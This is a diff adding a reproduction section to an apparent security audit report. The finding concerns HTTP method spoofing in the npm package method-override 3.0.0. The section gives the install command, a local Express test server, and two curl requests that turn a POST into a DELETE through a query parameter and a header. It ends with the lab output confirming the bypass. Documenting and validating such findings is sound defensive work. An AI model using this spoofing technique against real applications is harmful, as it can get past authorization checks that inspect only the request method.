@@ -55,4 +55,59 @@ Not reachability-tested (LOW severity).
 
 ---
 
+---
+
+## Reproduction (validated 2026-06-19)
+
+**Lab reference:** `targets/labs/npm-method-override/`
+
+**Pinned version:** method-override 3.0.0
+
+### Steps
+
+1. **Install dependencies:**
+   ```bash
+   npm install method-override@3.0.0 express
+   ```
+
+2. **Start a test server** with method-override middleware and a DELETE-only route:
+   ```javascript
+   const express = require('express');
+   const methodOverride = require('method-override');
+   const app = express();
+   app.use(methodOverride('_method'));
+   app.delete('/resource', (req, res) => res.json({ result: 'DELETE went through' }));
+   app.listen(5555);
+   ```
+
+3. **Send a POST with `_method=DELETE`** to spoof the HTTP method:
+   ```bash
+   curl -s -X POST "http://127.0.0.1:5555/resource?_method=DELETE"
+   ```
+
+4. **Repeat with the header variant:**
+   ```bash
+   curl -s -X POST "http://127.0.0.1:5555/resource" -H "X-HTTP-Method-Override: DELETE"
+   ```
+
+5. **Verify** the DELETE handler executed despite the request being a POST.
+
+### Observed output (from `targets/labs/npm-method-override/results.txt`)
+
+```
+method-override PoC -- version: 3.0.0
+  plain POST  -> { result: 'POST went through' }
+  POST+_method=DELETE -> { result: 'DELETE went through',
+    note: 'an authorization check that only inspects req.method would have been bypassed' }
+  POST+X-HTTP-Method-Override:DELETE -> { result: 'DELETE went through',... }
+
+  >>> MO-01 CONFIRMED: DELETE was reached via POST spoofing <<<
+```
+
+### Verdict
+
+**CONFIRMED.** Both `_method` query parameter and `X-HTTP-Method-Override` header override POST to DELETE in default configuration.
+
+---
+
 **Pipeline:** 3 raw findings → 2 confirmed (1 MEDIUM breachable, 1 LOW)
